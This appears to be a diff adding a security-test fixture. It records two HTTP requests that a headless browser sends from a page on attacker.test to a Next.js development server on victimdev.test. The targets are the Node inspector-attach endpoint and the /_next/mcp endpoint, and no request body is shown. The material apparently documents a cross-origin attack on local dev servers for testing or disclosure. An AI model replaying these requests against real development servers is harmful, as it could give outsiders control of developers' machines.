@@ -1,0 +1,26 @@
+----REQUEST----
+GET /__nextjs_attach-nodejs-inspector HTTP/1.1
+Host: victimdev.test:3021
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/141.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://attacker.test:8899/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+----REQUEST----
+POST /_next/mcp HTTP/1.1
+Host: victimdev.test:3021
+Connection: keep-alive
+Content-Length: 90
+Cache-Control: max-age=0
+Origin: http://attacker.test:8899
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/141.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://attacker.test:8899/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
